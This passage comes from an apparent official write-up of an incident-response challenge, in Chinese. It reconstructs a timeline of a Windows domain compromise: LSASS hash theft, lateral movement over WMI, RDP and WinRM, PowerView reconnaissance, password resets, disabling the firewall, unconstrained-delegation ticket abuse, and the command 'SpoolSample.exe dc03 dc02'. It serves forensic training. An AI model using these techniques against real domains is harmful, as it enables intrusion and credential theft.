<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 9:02:15创建管道spoolss，9:02:18 获取system权限</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-062.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-063.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 9:02:50访问进程lsass.exe,推测攻击者从中获取哈希</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-064.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 9:03:27 使用sql01账户通过wmi连接服务器</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-065.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 9:03:54 创建用户admin</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-066.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 9:03:55发现攻击者ip 10.0.100.85</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-067.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 9:05:14加载了pv.ps1,从文本中可发现该脚本实际为PowerView.ps1，主要作用是在域内做信息收集。</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-068.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-069.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-070.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 9:10:44 进行dns查询</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-071.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 9:11:15 修改administrator账户密码为Password@123</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-072.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 9:11:24.000 攻击者使用sql01本地管理员administrator账户RDP登陆服务器</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-073.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 9:11:26.000 修改防火墙配置</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-074.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 9:16:19.220 攻击者使用sql01账户登陆sql02数据库，之后执行命令下载木马并执行木马，提权后修改了sql02本地管理员administrator</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-075.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-076.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 9:22:07.000 疑似利用web漏洞执行命令</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-077.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 9:26:46.000 创建调用PowerView.ps1</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-078.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 9:33:54.000 web应用为域用户iis权限</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-079.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-080.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 9:59:44.000 修改web01本地管理员administrator密码</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-081.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 9:59:50 rdp连接</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-082.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 10:12:14 关闭防火墙</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-083.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 10:12:19 攻击者利用无约束委派请求票据，获取票据后利用票据获取域内账户hash</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-084.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-085.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 10:31:08 攻击者通过winrm使用administrator哈希登陆dc02</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-086.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 10:31:20 修改域管理员密码</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-087.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 10:31:28 RDP登陆</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-088.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 10:31:49-24/12/18 10:31:50 上传黑客工具</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-089.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 10:48:39 执行命令SpoolSample.exe dc03 dc02</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-090.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 10:53:02.000 注入票据</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-091.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 16:35:22 攻击者使用333.exe工具使10.0.11.6与10.0.11.8进行tcp连接</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-092.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 16:37:14 攻击者使用333.exe工具使10.0.11.6与10.0.11.10进行tcp连接</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-093.png)

